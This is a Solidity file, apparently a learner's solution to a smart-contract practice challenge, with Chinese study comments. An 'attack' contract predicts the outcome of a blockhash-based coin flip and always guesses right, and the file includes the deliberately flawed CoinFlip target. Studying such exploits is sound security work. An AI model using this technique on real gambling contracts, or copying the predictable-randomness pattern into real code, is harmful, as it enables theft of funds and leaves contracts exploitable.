// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack {
    CoinFlip private immutable target;//这个地方引用了被攻击的地址
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
//这题首先是将被攻击的对象的状态变量拿过来
    constructor(address _target){
        target = CoinFlip(_target);//这个地方利用输入的形式，用于得到这个被攻击的地址，顺便复习一下这里的语法
        //语法为 _name(_address)的形式
    }
    //下面这个函数用于和被攻击的函数相似的
    function flip() external {
        bool guess =_guess();
        require(target.flip(guess),"guess failed");
    }
    function _guess() private view returns(bool){
          uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
    }
}
//这是一个利用时间戳与哈希的伪随机合约，输入并且猜测来输出正确与否
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}